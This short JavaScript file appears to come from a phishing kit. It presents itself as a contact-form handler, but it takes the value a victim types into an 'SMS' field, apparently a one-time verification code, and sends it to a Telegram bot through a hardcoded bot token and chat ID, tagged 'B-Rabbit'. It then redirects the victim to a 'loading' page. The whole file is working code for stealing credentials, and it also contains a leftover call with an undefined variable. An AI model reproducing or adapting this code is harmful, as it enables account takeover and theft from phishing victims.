

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var SMS = getInputVal('SMS');
  e.preventDefault();
  let url = 'https://api.telegram.org/bot5496049863:AAH8j5MUHKXB_CyHt3gaRUiRFfyxVuIiofw/sendMessage?chat_id=-603913238&text=🐰🐰 B-Rabbit 🐰🐰:%0D%0A '+SMS;
  let xhttp = new XMLHttpRequest();
  xhttp.open("GET", url, true);
  xhttp.send();
  document.getElementById('SMS').value = ''
  setTimeout(function() { window.location.href = "loading.html"},1000);




  // Save messageloading.html
    saveMessage(ip, SMS);



  // Hide alert after 3 seconds
  setTimeout(function(){
    document.querySelector('.alert').style.display = 'none';
  },3000);

  // Clear form
  document.getElementById('contactForm').reset();
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}